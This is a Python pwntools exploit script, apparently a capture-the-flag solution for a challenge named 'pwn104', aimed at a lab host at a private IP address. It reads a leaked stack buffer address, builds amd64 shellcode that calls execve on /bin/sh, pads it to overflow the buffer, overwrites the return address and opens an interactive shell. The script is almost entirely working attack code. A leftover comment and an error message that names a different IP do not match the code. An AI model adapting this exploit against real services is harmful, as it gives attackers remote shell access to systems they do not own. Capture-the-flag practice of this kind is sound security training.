from pwn import *
import re

try:
    exploit = remote('10.10.114.118', 9004)
except PwnlibException as e:
    print(f"Could not connect to 10.10.50.134 on port 9004: {e}")
    exit(1)
#exploit = process('./pwn104')
output = exploit.recvuntil("I'm waiting for you at").decode()
output += exploit.recvline().decode()  # Receive the rest of the line containing the address

buffer_address = re.search(r'at (0x[0-9a-fA-F]+)', output).group(1)
buffer_address = int(buffer_address, 16)
print(f"Buffer address: {hex(buffer_address)}")
# Set the context for the shellcode
context.arch = 'amd64'  # or 'i386' for 32-bit

# Generate the shellcode to spawn a shell
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    syscall
''')
# Create the payload
payload = b''
payload += shellcode + b'\x90' * (88 - len(shellcode) )  # Fill the buffer
payload += p64(buffer_address)  # Overwrite 'b' with 0xc0ff33

print(len(payload))
try:
    # Send the payload
    exploit.sendline(payload)

    exploit.interactive()
except PwnlibException as e:
    print(f"Connection failed: {e}")
